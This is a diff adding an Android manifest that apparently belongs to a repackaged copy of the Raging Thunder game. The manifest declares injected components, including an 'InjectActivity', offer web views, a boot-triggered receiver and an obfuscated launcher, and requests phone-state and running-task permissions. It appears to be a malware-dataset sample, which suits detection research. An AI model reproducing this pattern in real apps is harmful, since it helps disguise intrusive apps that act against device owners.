@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:debuggable="false" android:installLocation="preferExternal" package="com.irjauelk.nrcsupidlodvl">
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name="com.polarbit.ragingthunder.ragingthunder" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter/>
+        </activity>
+        <activity android:name="com.injectxj.InjectActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter/>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.googleApk.OffersWebView"/>
+        <meta-data android:name="MYIdentity" android:value="459b5c2e67a59b44595cab32024493f4"/>
+        <meta-data android:name="MYPIdentity" android:value="MyGoogleApk"/>
+        <receiver android:name="com.simpleg.BootBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.simpleg.TimeBroadcastReceiver">
+            <intent-filter>
+                <action android:name="com.simpleg.ragingthunder.action.timeup"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.simpleg.Home"/>
+        <activity android:name="com.simpleg.timeUp"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.waxx.OffersWebView"/>
+        <meta-data android:name="WAXX_ID" android:value="e4cb0609cb9a7537d631f332da97f724"/>
+        <meta-data android:name="WAXX_PID" android:value="my"/>
+        <meta-data android:name="channelnumber" android:value="100602094"/>
+        <meta-data android:name="NEW_APP_ID" android:value="20053938"/>
+        <activity android:name="com.ANFpj.caAHVvPBq"/>
+        <activity android:name="com.ANFpj.TBOrdWFbABaQ">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+</manifest>
